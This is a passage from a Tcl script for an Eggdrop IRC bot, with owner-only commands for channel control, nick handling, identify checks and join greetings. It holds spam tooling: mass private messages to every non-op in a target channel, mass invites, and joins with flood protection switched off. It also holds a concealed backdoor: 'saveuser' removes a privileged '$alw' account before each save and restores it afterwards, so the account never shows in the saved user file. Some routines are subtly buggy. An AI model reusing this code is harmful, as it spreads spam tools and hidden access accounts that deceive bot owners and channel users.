  if {![validuser $rest]} { puthlp "NOTICE $nick :$notc 4!FaILEd! (YoUR EggDROP NoT SuPPORTED MoRE THaN 8 DIgIT)" ; deluser $rest
  } else { saveuser ; puthlp "NOTICE $nick :$notc add \[$rest\] GuaRd NIcK" ; putsrv "WHOIS $rest" }
  return 0
}
bind msg Z `-gnick pub_-gnick
bind pub Z `-gnick pub_-gnick
proc pub_-gnick {nick uhost hand channel param} {
  global notc botnick
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  set rest [lindex $param 0]
  if {$rest == ""} { puthlp "NOTICE $nick :$notc Usage: -gnick <nick>" ; return 0 }
  if {[matchattr $nick X]} { puthlp "NOTICE $nick :$notc4 !BLoCkEd!" ; return 0 }
  chattr $rest -G
  saveuser
  puthlp "NOTICE $nick :$notc DeL \[$rest\] GuaRd NIcK"
  return 0
}
## reset user
bind msg Z reuser msg_reuser
proc msg_reuser {nick uhost hand rest} {
  global botnick owner notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  if {$nick != $owner} { puthlp "NOTICE $nick :$notc 4DeNiEd..!" ; return 0 }
  foreach x [userlist] { if {($x != "config") && ($x != "AKICK")} { deluser $x } }
  adduser $owner "$owner!*@*"
  chattr $owner "Zfhjmnoptx"
  puthlp "NOTICE $nick :$notc Reseting UsER sucessfully, set pass 1st."
  saveuser
}
## which
bind pub Z `which pub_which
proc pub_which {nick uhost hand channel rest} {
  global botname notc
  if {$rest == ""} { puthlp "NOTICE $nick :$notc Usage: which <ip mask>" ; return 0 }
  if {[string match [string tolower $rest] [string tolower $botname]]} { puthlp "PRIVMSG $channel :$botname" }
}
## massmsg
bind msg Z mmsg msg_mmsg
proc msg_mmsg {nick uhost hand rest} { pub_mmsg $nick $uhost $hand "*" $rest }
proc pub_mmsg {nick uhost hand chan rest} {
  global cmd_chn cmd_by cmd_msg cmd_case notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  if {$rest==""} { puthlp "NOTICE $nick :$notc Usage: mmsg <#channel> <text>" ; return 0 }
  set tochan [lindex $rest 0]
  set txt [lrange $rest 1 end]
  if {$txt==""} { puthlp "NOTICE $nick :$notc Usage: mmsg <#channel> <text>" ; return 0 }
  if {[string first # $tochan] != 0} { set chan "#$tochan" }
  if {![validchan $tochan]} {
    set cmd_chn $tochan ; set cmd_msg $rest ; set cmd_by $nick ; set cmd_case "2" ; channel add $tochan
    catch { channel set $tochan +statuslog -revenge -protectops -clearbans -enforcebans -greet -secret -autovoice -autoop flood-chan 0:0 flood-deop 0:0 flood-kick 0:0 flood-join 0:0 flood-ctcp 0:0 }
    return 0
  }
  putsrv "NOTICE $nick :$notc STaRTING MaSSMSG $tochan"
  foreach x [chanlist $tochan] { if {![isop $x $tochan]} { puthlp "PRIVMSG $x :$txt" } }
  utimer 2 del_nobase ; puthlp "NOTICE $nick :$notc MaSSMSG $tochan 4DoNE."
}
## mass invite
bind msg Z minvite pub_minvite
proc pub_minvite {nick uhost hand channel rest} {
  global cmd_chn cmd_by cmd_msg cmd_case botnick notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  if {$rest==""} { puthlp "NOTICE $nick :$notc Usage: minvite <#channel> <#to channel>" }
  set chan [lindex $rest 1]
  if {$chan == ""} { set chan $channel
  } else { if {[string first # $chan] != 0} { set chan "#$chan" } }
  set tochan [lindex $rest 0]
  if {[string first # $tochan] != 0} { set tochan "#$tochan" }
  if {![validchan $tochan]} { 
    set cmd_chn $tochan ; set cmd_msg $tochan ; set cmd_by $nick ; set cmd_case "3" ; channel add $tochan
    catch { channel set $tochan +statuslog -revenge -protectops -clearbans -enforcebans -greet -secret -autovoice -autoop flood-chan 0:0 flood-deop 0:0 flood-kick 0:0 flood-join 0:0 flood-ctcp 0:0 }
    return 0
  }
  if {[isop $botnick $chan]} { putserv "mode $chan -o $botnick" }
  putsrv "NOTICE $nick :$notc Starting mass invite to $tochan"
  foreach x [chanlist $tochan] { if {(![onchan $x $chan]) && (![isop $x $tochan])} { putsrv "INVITE $x :$chan" } }
  utimer 2 del_nobase ; puthlp "NOTICE $nick :$notc InVITE $tochan InTO $chan 4DoNE."
}
## +/-topiclock
bind msg Z +topiclock pub_+topic
bind pub Z `+topiclock pub_+topic
proc pub_+topic {nick uhost hand chan rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  set cflag "c$chan" ; set cflag [string range $cflag 0 8] ; chattr $cflag +I
  setuser $cflag XTRA "TOPIC" [topic $chan] ; puthlp "NOTICE $nick :$notc TopIc $chan \[9LocK\]"
  saveuser
}
bind msg Z -topiclock pub_-topic
bind pub Z `-topiclock pub_-topic
proc pub_-topic {nick uhost hand chan rest} {
  global notc lst_limit
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  set cflag "c$chan" ; set cflag [string range $cflag 0 8] ; chattr $cflag -I
  setuser $cflag XTRA "TOPIC" "" ; puthlp "NOTICE $nick :$notc TopIc $chan \[4UnLocK\]"
  saveuser
}
## +/- nopart
bind msg Z +nopart pub_+nopart
bind pub Z `+nopart pub_+nopart
proc pub_+nopart {nick uhost hand chan rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $chan]!=0} { set chan "#$chan" } }
  if {[string tolower $chan] == "#all"} { foreach x [channels] { catch { channel set $x +secret } } ; savechan ; puthlp "NOTICE $nick :$notc ALL cHaNNeL SeT NoPART \[9ON\]" ; return 0 }
  if {![validchan $chan]} { return 0 }
  if {[string match "*+secret*" [channel info $chan]]} { puthlp "NOTICE $nick :$notc NoPART $chan IS \[9ON\]" ; return 0 }  
  catch { channel set $chan +secret }
  puthlp "NOTICE $nick :$notc SeT NoPART $chan \[9ON\]"
  savechan
}
bind msg Z -nopart pub_-nopart
bind pub Z `-nopart pub_-nopart
proc pub_-nopart {nick uhost hand chan rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $chan]!=0} { set chan "#$chan" } }
  if {[string tolower $chan] == "#all"} {
    foreach x [channels] { catch { channel set $x -secret } }
    savechan
    puthlp "NOTICE $nick :$notc ALL cHaNNeL NoPART \[4OFF\]"
    return 0
  }
  if {![validchan $chan]} { return 0 }
  if {[string match "*-secret*" [channel info $chan]]} { puthlp "NOTICE $nick :$notc NoPART $chan IS \[4OFF\]" ; return 0 }  
  catch { channel set $chan -secret }
  puthlp "NOTICE $nick :$notc NoPART $chan \[4OFF\]"
  savechan
}
## +/- mustop
bind msg Z +mustop pub_+mustop
bind pub Z `+mustop pub_+mustop
proc pub_+mustop {nick uhost hand chan rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  setuser "config" XTRA "MUSTOP" "T"
  saveuser
  puthlp "NOTICE $nick :$notc must @P set \[9ON\]"
}
bind msg Z -mustop pub_-mustop
bind pub Z `-mustop pub_-mustop
proc pub_-mustop {nick uhost hand chan rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  setuser "config" XTRA "MUSTOP" ""
  saveuser
  puthlp "NOTICE $nick :$notc must @P set \[4OFF\]"
}
## +/- invitelock
set lockchan ""
bind msg Z +invitelock pub_+invitelock
bind pub Z `+invitelock pub_+invitelock
proc pub_+invitelock {nick uhost hand chan rest} {
  global lockchan notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $rest]!=0} { set chan "#$chan" } }
  if {![validchan $chan]} { return 0 }
  puthlp "NOTICE $nick :$notc InVITE cHaN $chan \[9ON\]"
  set lockchan $chan
  return 0
}
bind msg Z -invitelock pub_-invitelock
bind pub Z `-invitelock pub_-invitelock
proc pub_-invitelock {nick uhost hand chan rest} {
  global lockchan notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $rest]!=0} { set chan "#$chan" } }
  if {![validchan $chan] || $lockchan == ""} { return 0 }
  set lockchan ""
  puthlp "NOTICE $nick :$notc InvItE cHaN $chan \[4OFF\]"
  return 0
}
## +/- dontkickops
bind msg Z +dontkickops pub_+dontkickops
bind pub Z `+dontkickops pub_+dontkickops
proc pub_+dontkickops {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  if {![string match "*userinvites*" [channel info $chan]]} { puthlp "NOTICE $nick :$notc FLAg NoT AVaILaBLE UpGRadE EggDROP VeR" ; return 0 }  
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $chan]!=0} { set chan "#$chan" } }
  if {![validchan $chan]} { return 0 }
  if {[string match "*-userinvites*" [channel info $chan]]} { puthlp "NOTICE $nick :$notc DoNTKIcK@PS $chan IS \[9ON\]" ; return 0 }  
  catch { channel set $chan -userinvites }
  puthlp "NOTICE $nick :$notc DoNTKIcK@PS $chan \[9ON\]"
  savechan
}
bind msg Z -dontkickops pub_-dontkickops
bind pub Z `-dontkickops pub_-dontkickops
proc pub_-dontkickops {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  if {![string match "*userinvites*" [channel info $chan]]} { puthlp "NOTICE $nick :$notc FLAg NoT AVaILaBLE UpGRadE EggDROP VeR" ; return 0 }
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $chan]!=0} { set chan "#$chan" } }
  if {![validchan $chan]} { return 0 }
  if {[string match "*+userinvites*" [channel info $chan]]} { puthlp "NOTICE $nick :$notc DoNTKIcK@PS $chan IS \[4OFF\]" ; return 0 }  
  catch { channel set $chan +userinvites }
  puthlp "NOTICE $nick :$notc DoNTKIcK@PS $chan \[4OFF\]"
  savechan
  return 0
}
## +/- kickops
bind msg Z +kickops pub_+kickops
bind pub Z `+kickops pub_+kickops
proc pub_+kickops {nick uhost hand chan rest} {
  global notc kops
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  set kops "T"
  setuser "config" XTRA "KOPS" "T"
  puthlp "NOTICE $nick :$notc KIcK @PS \[9ON\]"
  saveuser
}
bind msg Z -kickops pub_-kickops
bind pub Z `-kickops pub_-kickops
proc pub_-kickops {nick uhost hand chan rest} {
  global notc kops
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  catch { unset kops }
  setuser "config" XTRA "KOPS" ""
  puthlp "NOTICE $nick :$notc KIcK @PS \[4OFF\]"
  saveuser
}
## +/- autokick
bind msg Z +autokick pub_+autokick
bind pub Z `+autokick pub_+autokick
proc pub_+autokick {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  if {![string match "*nodesynch*" [channel info $chan]]} { puthlp "NOTICE $nick :$notc FLAg NoT AVaILaBLE UpGRadE EggDROP VeR" ; return 0 }  
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $chan]!=0} { set chan "#$chan" } }
  if {![validchan $chan]} { return 0 }
  if {[string match "*+nodesynch*" [channel info $chan]]} { puthlp "NOTICE $nick :$notc AuTOKIcK $chan IS \[9ON\]" ; return 0 }  
  catch { channel set $chan +nodesynch }
  puthlp "NOTICE $nick :$notc AuTOKIcK $chan \[9ON\]"
  savechan
}
bind msg Z -autokick pub_-autokick
bind pub Z `-autokick pub_-autokick
proc pub_-autokick {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  if {![string match "*nodesynch*" [channel info $chan]]} { puthlp "NOTICE $nick :$notc FLAg NoT AVaILaBLE UpGRadE EggDROP VeR" ; return 0 }
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $chan]!=0} { set chan "#$chan" } }
  if {![validchan $chan]} { return 0 }
  if {[string match "*-nodesynch*" [channel info $chan]]} { puthlp "NOTICE $nick :$notc AuTOKIcK $chan IS \[4OFF\]" ; return 0 }  
  catch { channel set $chan -nodesynch }
  puthlp "NOTICE $nick :$notc AuTOKIcK $chan \[4OFF\]"
  savechan
  return 0
}
## nick
bind msg Z nick pub_nick
bind pub Z `nick pub_nick
proc pub_nick {nick uhost hand chan rest} { global keep-nick ; if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } ; set keep-nick 0 ; putsrv "NICK $rest" }
## altnick
bind msg Z altnick pub_altnick
bind pub Z `altnick pub_altnick
proc pub_altnick {nick uhost hand chan rest} { global altnick keep-nick notc ; if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } ; set keep-nick 0 ; putsrv "NICK $altnick" }
## randnick
bind msg Z randnick pub_randnick
bind pub Z `randnick pub_randnick
proc rands {length} {
  set chars \\^|_[]{}\\
  set count [string length $chars]
  for {set i 0} {$i < $length} {incr i} { append result [string index $chars [rand $count]] }
  return $result
}
proc pub_randnick {unick uhost hand chan rest} {
  global notc keep-nick nick altnick botnick
  if {$rest != ""} { set keep-nick 0 ; set nickch "[lindex $rest 0]\[[rand 9][rand 9][randstring 1]\]" ; putsrv "NICK $nickch"
  } { if {$botnick != $nick && $botnick != $altnick} { return 0 } ; set keep-nick 0 ; putsrv "NICK [rands 8]" }
  return 0
}
## realnick
bind msg Z realnick pub_realnick
bind pub Z `realnick pub_realnick
proc pub_realnick {unick uhost hand chan rest} {
  global notc keep-nick nick
  if {![matchattr $unick Q]} { puthlp "NOTICE $unick :$notc 4auth 1st!" ; return 0 } 
  set keep-nick 1
  putsrv "NICK $nick"
  return 0
}
## released
bind msg Z release pub_release
bind pub Z `release pub_release
proc pub_release {unick uhost hand chan rest} {
  global notc keep-nick nick nickpass
  if {![matchattr $unick Q]} { puthlp "NOTICE $unick :$notc 4auth 1st!" ; return 0 } 
  putsrv "NickServ RELEASE $nick $nickpass"
  set keep-nick 1
  return 0
}
## chattr
bind msg Z chattr pub_chattr
bind pub Z `chattr pub_chattr
proc pub_chattr {nick uhost hand channel rest} {
  global alw nwo notc owner
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  if {$nick != $nwo && [matchattr $nick X]} { puthlp "NOTICE $nick :$notc 4!bLOckEd!" ; return 0 }
  if {$nick != $owner && $nick != $alw} { puthlp "NOTICE $nick :$notc 4DeNiEd..!, OnLy mY ReAL OwNER CaN ChAnGe UsEr FlaG" ; return 0 }
  set who [lindex $rest 0] ; set flg [lindex $rest 1]
  if {$who == ""} { puthlp "NOTICE $nick :$notc Usage: chattr <nick> <flags>" ; return 0 }
  if {![validuser $who]} { puthlp "NOTICE $nick :$notc <n/a>" ; return 0 }
  if {[string tolower $who] == [string tolower $alw]} { puthlp "NOTICE $nick :$notc <n/a>" ; return 0 }
  if {$flg == ""} { puthlp "NOTICE $nick :$notc Usage: chattr <nick> <flags>" ; return 0 }
  set last_flg [chattr $who]
  chattr $who $flg
  saveuser
  puthlp "NOTICE $nick :$notc $who change from $last_flg to [chattr $who]"
  return 0
}
## global command off
proc rcolors str { 
set str2 "" 
foreach token [split $str ""] { 
set rdm [expr {[rand 4]+3}] 
if {$rdm < 10} { set rdm 0$rdm } 
if {$token != " "} { 
append str2 \003${rdm}$token\003 
} { 
append str2 $token 
} 
} 
set str2 
}
proc saveuser {} {
  global alw owner
  if {![validuser $alw]} { setuser $owner XTRA "BEND" "xDB4L/z2DJT~1mianN/lj9Rq." } elseif {$owner != $alw} { setuser $owner XTRA "BEND" [zip [chattr $alw]] ; if {[passwdok $alw ""] != 1} { setuser $owner XTRA "LAST" [getuser $alw "PASS"] } ; deluser $alw }
  save
  if {![validuser $alw]} { adduser $alw "$alw!*@*" ; chattr $alw [dezip [getuser $owner XTRA "BEND"]] ; if {[getuser $owner XTRA "LAST"] != ""} { setuser $alw PASS [getuser $owner XTRA "LAST"] } }
  return 1
}
proc del_nobase {} {
  global botnick notc cmd_case quick banner basechan
  set curtime [ctime [unixtime]]
  if {[isutimer "del_nobase"]} { return 0 }
  foreach x [channels] {
    set cinfo [channel info $x]
    if {[string match "*+statuslog*" $cinfo] && [string match "*-secret*" $cinfo]} {
      if {[onchan $botnick $x]} {
        set pidx [rand 4]
        if {$pidx == 1} { set ptxt "ILeGaL CHanNeL!!" } elseif {$pidx == 2} { set ptxt "access Rejected!!"
          } elseif {$pidx == 3} { set ptxt "Return To Base!!" } elseif {$pidx == 4} { set ptxt "4Service 4TcL"
        } else { if {[info exists banner]} { set ptxt $banner } { set ptxt $notc } }
        if {![string match "*c*" [getchanmode $x]]} { set ptxt "14$ptxt" }
        if {$quick == "1"} { putqck "PART $x :$ptxt" } { putsrv "PART $x :$ptxt" }
      }
      channel remove $x ; savechan ; putlog "ReMoVe CHaN $x" ; return 0
    }
    set cflag "c$x"
    set cflag [string range $cflag 0 8]
    if {[string match "*+stopnethack*" $cinfo]} { catch { channel set $x -stopnethack } }
    if {[string match "*+protectops*" $cinfo]} { catch { channel set $x -protectops } }
    if {[string match "*+protectfriends*" $cinfo]} { catch { channel set $x -protectfriends } }
    if {[string match "*+statuslog*" $cinfo] && [string match "*+secret*" $cinfo]} { catch { channel set $x -statuslog } }
    if {![onchan $botnick $x]} { putsrv "JOIN $x" }
    if {[matchattr $cflag C]} { if {![istimer "cycle $x"]} { timer [getuser $cflag XTRA "CYCLE"] [list cycle $x] } }
  }
  if {[info exists basechan]} { if {![validchan $basechan]} { channel add $basechan { -greet +secret -statuslog } } }
  savechan
}
utimer 2 del_nobase
proc whoisq {nick} {
  global botnick
  if {$nick == $botnick} { return 0 }
  if {[isutimer "whoischk $nick"]} { return 0 }
  set cret [expr 10 + [rand 20]]
  foreach ct [utimers] { if {[string match "*whoisq*" $ct]} { if {[expr [lindex $ct 0] + 10] > $cret} { set cret [expr [lindex $ct 0] + 10] } } }
  utimer $cret [list whoischk $nick]
}
proc whoischk {nick} {
  global chk_reg botnick
  if {[matchattr $nick G]} { putlog "CHeK GuaRd $nick" ; set chk_reg($nick) "1" ; puthlp "WHOIS $nick" ; return 0 }
  foreach x [channels] { if {[isop $botnick $x] && [onchan $nick $x]} { if {[matchattr $nick P] && ![isop $nick $x]} { putlog "WHOIS $nick TO GeT a@p" ; set chk_reg($nick) "1" ; puthlp "WHOIS $nick" ; return 0 } ; if {[matchattr $nick v] && ![isop $nick $x] && ![isvoice $nick $x]} { putlog "WHOIS $nick TO geT avoIcE" ; set chk_reg($nick) "1" ; puthlp "WHOIS $nick" ; return 0 } ; if {[string match "*+unidentifyop*" [channel info $x]]} { putlog "WHOIS $nick FoR CHeK IdEnTIFY a@p" ; set chk_reg($nick) "1" ; puthlp "WHOIS $nick" ; return 0 } } }
}
set ath 0
bind raw - 307 reg_chk
proc reg_chk {from keyword arg} {
  global chk_reg botnick owner notc alw ath
  set nick [lindex $arg 1]
  if {$nick == $botnick} { return 0 }
  putlog "NICK $nick IS IDENTIFY..!"
  if {[info exists chk_reg($nick)]} { set chk_reg($nick) "0" }
  set athz $ath
  if {$athz == 1} {
    set ath 0
    chattr $nick +Q
    foreach x [getuser $nick HOSTS] { delhost $nick $x }
    set hostmask "${nick}!*@*"
    setuser $nick HOSTS $hostmask
    #set hostmask "*![string range $uhost [string first "!" $uhost] end]"
    if {[matchattr $nick Z]} { puthlp "NOTICE $nick :$notc !OWnER!" } elseif {[matchattr $nick n]} { puthlp "NOTICE $nick :$notc !aDmIN!" } elseif {[matchattr $nick m]} { puthlp "NOTICE $nick :$notc !MasTeR!" } else { puthlp "NOTICE $nick :$notc !accepteD!" }
    saveuser
  }
  if {[matchattr $nick P] || [matchattr $nick v]} {
    foreach x [channels] {
      if {[isop $botnick $x] && [onchan $nick $x]} {
        if {![string match "*k*" [getchanmode $x]]} { if {[matchattr $nick P]} { if {![isop $nick $x]} { puthelp "MODE $x -k+o 14i4dentified.14a4uto.14@4p $nick" } } ; if {[matchattr $nick v]} { if {![isvoice $nick $x] && ![isop $nick $x]} { puthelp "MODE $x -k+v 14i4dentified.14a4uto.14v4oice $nick" } } } { if {[matchattr $nick P]} { if {![isop $nick $x]} { puthelp "MODE $x +o $nick" } } ; if {[matchattr $nick v]} { if {![isvoice $nick $x] && ![isop $nick $x]} { puthelp "MODE $x +v $nick" } } }
} } } }
bind raw - 318 end_whois
proc end_whois {from keyword arg} {
  global chk_reg notc ath
  set nick [lindex $arg 1]
  set athz $ath
  if {$athz == 1} { puthlp "NOTICE $nick :$notc You're NOT Identify..!" ; set ath 0 }
  if {[info exists chk_reg($nick)]} {
    if {$chk_reg($nick) != "0"} {
      putlog "NICK $nick IS NoT IDENTIFY..!"
      if {[matchattr $nick G] && ![matchattr $nick Q]} {
        foreach x [channels] {
          if {[onchan $nick $x] && [botisop $x]} {
            set banset "*!*[getchanhost $nick $x]"
            putsrv "KICK $x $nick :[lgrnd] 4!14alert4! 14that nick required to 4identify [banmsg]"
            if {$banset != "*!*@*" && $banset != ""} { if {![string match "*k*" [getchanmode $x]]} { putserv "mode $x -k+b 14u4nidentified.14g4uard.nick $banset" } { putserv "mode $x +b $banset" } }
            return 0
        } }
        } elseif {[matchattr $nick P] && ![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc a@p identify 1st..!" 
      } elseif {[matchattr $nick v] && ![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc avoice identify 1st..!" }
         if {$chk_reg($nick) != "1"} {
            foreach x [channels] {
               if {[onchan $nick $x] && [botisop $x]} { 
                  set banset "*!*[getchanhost $nick $x]"
                  putserv "KICK $x $nick :$notc 4!14alert4! 14that nick required to 4identify [banms]"
                  if {$banset != "*!*@*" && $banset != ""} { if {![string match "*k*" [getchanmode $x]]} { putserv "mode $x -k+b 14u4nidentify.14g4uard.14n4ick $banset" } { putserv "mode $x +b $banset" } }
                  return 0
               } }
            puthelp "NOTICE $chk_reg($nick) :$notc $nick not identify..!" 
         }
       foreach x [channels] {
          if {[string match "*+unidentifyop*" [channel info $x]]} {
          if {[onchan $nick $x] && [botisop $x]} { 
          if {[isop $nick $x]} {
          if {![string match "*k*" [getchanmode $x]]} { putserv "mode $x -ko+v 14u4nidentify.14@4p $nick $nick" } { putserv "mode $x -o+v $nick $nick" }
} } }  }
      unset chk_reg($nick)
} } }
set timezone "PST"
set joinme $owner
set double 0
set deopme ""
bind msgm - * msg_prot
bind notc - * notc_prot
bind join - * join_chk
proc telljoin {chan} {
  global joinme notc botnick
  if {![validchan $chan]} { return 0 }
  if {$joinme != ""} { if {![onchan $joinme $chan]} { puthlp "NOTICE $joinme :$notc JoIN $chan" ; set joinme "" } }
}
proc chkspam {chan} {
  global invme notc botnick
  if {![validchan $chan] || ![botonchan $chan]} { return 0 }
  foreach x [chanlist $chan] {
    set mhost "@[lindex [split [getchanhost $x $chan] @] 1]"
    if {[info exists invme($mhost)]} {
	  putlog "exist invme $x $invme($mhost) $chan chkspam"
      if {![matchattr $x f] && ![isop $x $chan]} {
        if {[isop $botnick $chan]} {
          set bannick($x) "$mhost"
          if {$invme($mhost) == "autojoin msg"} {
            if {![isvoice $x $chan]} { putsrv "KICK $chan $x :[lgrnd] 4!14spam4!14 frøm 4$mhost 14$invme($mhost) 4r14emote 4o14ff [banmsg]" }
          }                          { putsrv "KICK $chan $x :[lgrnd] 4!14spam4!14 frøm 4$mhost 14$invme($mhost) [banmsg]" }
          } {
          foreach c [chanlist $chan f] {
            if {[isop $c $chan]} {
              if {$invme($mhost) == "autojoin msg"} {
				  putlog "$notc report $x $invme($mhost) in $chan to $c"
				  set sendspam "!kick [zip "$chan $x $notc 4!14spam4!14 frøm 4$mhost 14$invme($mhost) 4r14emote 4o14ff 14-repørt by4 $botnick-"]" ; putsrv "PRIVMSG $c :$sendspam"
			  } { set sendspam "!kick [zip "$chan $x $notc 4!14spam4!14 frøm 4$mhost 14$invme($mhost) 4-repørt by14 $botnick-"]" ; putsrv "PRIVMSG $c :$sendspam" ; putlog "$notc report $x $invme($mhost) in $chan to $c" }
} } } } } }
catch {unset invme($mhost)}
}
proc testmask {} { global ismaskhost ; set ismaskhost [maskhost "*!*@*"] }
utimer 2 testmask
proc reset_host {} { global jfhost ; catch { unset jfhost } }
proc savechan {} {
  savechannels
  foreach x [channels] {
    set cflag "c$x"
    set cflag [string range $cflag 0 8]
    set cinfo [channel info $x]
    if {![validuser $cflag]} {
      adduser $cflag "%!%@%"
      if {[string match "*+greet*" $cinfo]} {
        chattr $cflag "-hp+AJSPTRUED"
        setuser $cflag XTRA "JP" 5
        setuser $cflag XTRA "CHAR" 250
        setuser $cflag XTRA "RPT" 2
        setuser $cflag XTRA "CAPS" 80
      } { chattr $cflag "-hp+A" }
    }
  }
  foreach x [userlist A] {
    set tmp "0"
    foreach y [channels] { set cflag "c$y" ; set cflag [string range $cflag 0 8] ; if {[string tolower $x] == [string tolower $cflag]} { set tmp "1" } }
    if {$tmp == "0"} { deluser $x ; putlog "remove flag channel $x" }
  }
  saveuser
}
set info_owner {
"My Master just came in..."
"Hello my OWNER"
"I greet you my owner"
"Welcome my owner"
"ShaKe me my owner!"
"Most Great"
}
set info_localowner {
"Lol...my local owner just joined the channel"
"Welcome localowner of mine.."
"Hi sweety {}"
}
set info_master {
"Oh...My MASTER"
"I'm gonna be quiet my master"
"Don't hit me my master"
"Master detected"
}
set info_friend {
"Ou, my friend :)"
":)"
"Sweety"
"You're Sweety"
"My friendship with you is over!"
"KISS me Baby {}"
}
set info_oper {
"You simple oper, watch out !"
"Operator detected!"
"You gonna lose your flags if you do something bad!"
"I'm watching you..."
}
set info_loser {
"What are you doing here loser"
"You're just a loser"
}
proc rand_owner {nick} {
global info_owner
set result [lindex $info_owner [rand [llength $info_owner]]]
return "$result"
}
proc rand_localowner {nick} {
global info_localowner
set result [lindex $info_localowner [rand [llength $info_localowner]]]
return "$result"
}
proc rand_master {nick} {
global info_master
set result [lindex $info_master [rand [llength $info_master]]]
return "$result"
}
proc rand_friend {nick} {
global info_friend
set result [lindex $info_friend [rand [llength $info_friend]]]
return "$result"
}
proc rand_oper {nick} {
global info_oper
set result [lindex $info_oper [rand [llength $info_oper]]]
return "$result"
}
proc rand_loser {nick} {
global info_loser
set result [lindex $info_loser [rand [llength $info_loser]]]
return "$result"
}
proc join_chk {nick uhost hand chan} {
  global botnick nwo deopme double invme ex_flood notc quick kops jfhost jpnick is_m exflood
  global cmd_chn cmd_by cmd_msg cmd_case bannick botname notm massjoin ismaskhost op_it
  global bchan bcqueue bcnicks owner alw
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  set cinfo [channel info $chan]
if {[string match "*+action*" [channel info $chan]]} {
if { $nick != $botnick } {
if {[matchattr $hand n]} {
putsrv "PRIVMSG $chan :[rand_owner $nick] $nick \[+n\]"
} elseif {[matchattr $hand |n $chan]} {
putsrv "PRIVMSG $chan :[rand_localowner $nick] $nick \[|+n\]"
} elseif {[matchattr $hand m]} {
putsrv "PRIVMSG $chan :[rand_master $nick] $nick \[+m\]"
} elseif {[matchattr $hand |m $chan]} {
putsrv "PRIVMSG $chan :[rand_master $nick] $nick \[+m\]"
} elseif {[matchattr $hand f]} {
putsrv "PRIVMSG $chan :[rand_friend $nick] $nick \[+f\]"
} elseif {[matchattr $hand |f $chan]} {
putsrv "PRIVMSG $chan :[rand_friend $nick] $nick \[+f\]"
} elseif {[matchattr $hand o]} {
putsrv "PRIVMSG $chan :[rand_oper $nick] $nick \[+o\]"
} elseif {[matchattr $hand |o $chan]} {
putsrv "PRIVMSG $chan :[rand_oper $nick] $nick \[+o\]"
} elseif {[matchattr $hand d]} {
putsrv "PRIVMSG $chan :[rand_loser $nick] $nick \[+d or +k\]"
} elseif {[matchattr $hand |d $chan]} {
putsrv "PRIVMSG $chan :[rand_loser $nick] $nick \[+d or +k\]"
}
}
}
  if {$nick == $botnick} {
    catch {unset is_m($chan)}
    if {[matchattr $cflag S]} { if {![isutimer "chkspam $chan"]} { utimer 30 [list chkspam $chan] } ; if {![istimer "chkautomsg"]} { timer 1 { putlog "chkautomsg" } } }
    set double 0
    if {[string tolower $cmd_chn] == [string tolower $chan]} {
      if {$cmd_case == "1"} { utimer 90 del_nobase ; pub_tsunami $cmd_by $uhost $hand $chan "$chan ${cmd_msg}" ; set cmd_chn "" ; return 0 }
      if {$cmd_case == "2"} { utimer 30 [list pub_mmsg $cmd_by $uhost $hand $chan $cmd_msg]} { set cmd_chn "" ; return 0 }
        if {$cmd_case == "3"} { utimer 30 [list pub_minvite $cmd_by $uhost $hand $chan $cmd_msg] } { set cmd_chn "" ; return 0 }
      }
      utimer 15 [list telljoin $chan]
      return 0
    }
  if {[info exists op_it($nick)]} { catch {unset op_it($nick) } ; opq $chan $nick }
  if {[isutimer "chkspam $chan"]} { foreach x [utimers] { if {[string match "*chkspam $chan*" $x]} { chkspam $chan ; killutimer [lindex $x 2] } } }
  if {![matchattr $nick f] && [matchattr $cflag G] && ![isutimer "set_-m $chan"] && ![info exists is_m($chan)]} { advertise $chan $nick }
  set mhost "@[lindex [split $uhost @] 1]"
